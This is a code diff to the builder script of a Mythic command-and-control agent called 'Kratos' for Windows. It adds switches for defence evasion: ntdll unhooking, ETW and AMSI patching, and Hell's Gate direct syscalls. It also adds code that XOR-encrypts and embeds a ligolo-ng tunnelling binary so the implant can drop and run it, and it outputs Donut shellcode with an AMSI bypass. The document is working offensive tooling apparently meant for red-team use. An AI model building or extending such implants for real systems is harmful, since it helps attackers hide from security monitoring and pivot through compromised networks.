@@ -1,4 +1,5 @@
 import logging
+import os
 import pathlib
 import base64
 from mythic_container.PayloadBuilder import *
@@ -16,7 +17,7 @@ class Kratos(PayloadType):
     author = "@goultarde"
     supported_os = [SupportedOS.Windows]
     wrapper = False
-    wrapped_payloads = []
+    wrapped_payloads = ["atreus"]
     note = "A simple C agent named Kratos."
     supports_dynamic_loading = True
     mythic_encrypts = True
@@ -41,6 +42,40 @@ class Kratos(PayloadType):
             choices=["exe", "shellcode"],
             default_value="exe",
             description="Output format: Executable or Raw Shellcode (via Donut)"
+        ),
+        BuildParameter(
+            name="evasion_unhook",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=True,
+            description="EDR evasion: remap ntdll from disk to remove userland hooks"
+        ),
+        BuildParameter(
+            name="evasion_etw",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=True,
+            description="EDR evasion: patch EtwEventWrite* to silence ETW telemetry"
+        ),
+        BuildParameter(
+            name="evasion_amsi",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=True,
+            description="EDR evasion: patch AmsiScanBuffer/String to bypass AMSI"
+        ),
+        BuildParameter(
+            name="evasion_syscalls",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=True,
+            description="EDR evasion: Hell's Gate direct syscalls (bypass hooked Nt* functions)"
+        ),
+        BuildParameter(
+            name="embedded_binary",
+            parameter_type=BuildParameterType.File,
+            required=False,
+            description=(
+                "Optional binary to embed in the agent (e.g. custom ligolo-ng agent). "
+                "If provided, the 'ligolo' command drops and executes it directly without upload. "
+                "Leave empty to disable."
+            )
         ),
     ]
     agent_path = pathlib.Path(".") / "kratos" / "mythic"
@@ -167,6 +202,12 @@ class Kratos(PayloadType):
             crypto_backend = self.get_parameter("crypto_backend")
             crypto_define = "-DUSE_TINY_AES" if crypto_backend == "tiny_aes" else "-DUSE_BCRYPT"
 
+            evasion_defines = ""
+            if self.get_parameter("evasion_unhook"):   evasion_defines += "-DEVASION_UNHOOK "
+            if self.get_parameter("evasion_etw"):      evasion_defines += "-DEVASION_ETW "
+            if self.get_parameter("evasion_amsi"):     evasion_defines += "-DEVASION_AMSI "
+            if self.get_parameter("evasion_syscalls"): evasion_defines += "-DEVASION_SYSCALLS "
+
             # Read the template config.h file
             config_path = pathlib.Path(agent_build_path.name) / "config.h"
             with open(config_path, "r") as f:
@@ -206,8 +247,61 @@ class Kratos(PayloadType):
                 StepSuccess=True
             ))
 
-            # Pass CFLAGS to make (commandes + backend crypto)
-            command = f"make CC=x86_64-w64-mingw32-gcc CFLAGS=\"{command_defines} {crypto_define} -DBUILD\""
+            # Embedded ligolo-ng → shellcode via Donut → XOR encrypted → embedded_ligolo.h
+            # Triggered automatically if ligolo_start is selected.
+            # Priority: user-provided embedded_binary > bundled binaries/agent.exe
+            embedded_define = ""
+            ligolo_selected = "ligolo_start" in self.commands.get_commands()
+
+            if ligolo_selected:
+                embedded_file_id = self.get_parameter("embedded_binary")
+                embedded_data = None
+                source = ""
+
+                if embedded_file_id:
+                    file_resp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
+                        AgentFileId=embedded_file_id
+                    ))
+                    if file_resp.Success and file_resp.Content:
+                        embedded_data = file_resp.Content
+                        source = "user-provided"
+
+                if embedded_data is None:
+                    fallback_path = pathlib.Path("/Mythic/binaries/agent.exe")
+                    if fallback_path.exists():
+                        with open(fallback_path, "rb") as fb:
+                            embedded_data = fb.read()
+                        source = f"bundled binaries/agent.exe ({len(embedded_data)} bytes)"
+
+                if embedded_data:
+                    # XOR-encrypt raw PE with a random 16-byte key (new key per build).
+                    # No Donut here: the PE is written to disk at runtime so that
+                    # ligolo-ng receives its CLI args (-connect, -ignore-cert, etc.)
+                    # via CreateProcessW. Donut shellcode cannot accept runtime arguments.
+                    xor_key = list(os.urandom(16))
+                    encrypted = bytes(b ^ xor_key[i % 16] for i, b in enumerate(embedded_data))
+                    hex_enc = ", ".join(f"0x{b:02x}" for b in encrypted)
+                    hex_key = ", ".join(f"0x{b:02x}" for b in xor_key)
+                    header = (
+                        "#pragma once\n"
+                        f"static const unsigned char g_ligolo_data[] = {{{hex_enc}}};\n"
+                        f"static const unsigned int  g_ligolo_size   = {len(encrypted)};\n"
+                        f"static const unsigned char g_ligolo_key[]  = {{{hex_key}}};\n"
+                        f"static const unsigned int  g_ligolo_key_size = 16;\n"
+                    )
+                    header_path = pathlib.Path(agent_build_path.name) / "embedded_ligolo.h"
+                    with open(header_path, "w") as hf:
+                        hf.write(header)
+                    embedded_define = "-DEMBEDDED_LIGOLO"
+                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                        PayloadUUID=self.uuid,
+                        StepName="Configuring",
+                        StepStdout=f"Ligolo-ng ({source}): {len(embedded_data)} bytes raw PE → XOR encrypted → embedded_ligolo.h",
+                        StepSuccess=True
+                    ))
+
+            # Pass CFLAGS to make (commandes + backend crypto + evasion + embedded)
+            command = f"make CC=x86_64-w64-mingw32-gcc CFLAGS=\"{command_defines} {crypto_define} {evasion_defines} {embedded_define} -DBUILD\""
             
             proc = await asyncio.create_subprocess_shell(
                 command,
@@ -241,7 +335,7 @@ class Kratos(PayloadType):
 
             if output_format == "shellcode":
                 try:
-                    # Génère le shellcode x64 via Donut
+                    # Generate x64 shellcode via Donut
                     # arch=2 (x64), bypass=3 (AMSI/WLDP), format=1 (raw)
                     payload = donut.create(
                         file=str(exe_path),
@@ -249,7 +343,7 @@ class Kratos(PayloadType):
                         bypass=3,
                         format=1
                     )
-                    resp.payload = payload
+                    resp.payload = bytes(payload)
                     resp.updated_filename = self.filename if self.filename.endswith(".bin") else self.filename + ".bin"
                     resp.build_message = "Successfully built Kratos shellcode"
                     
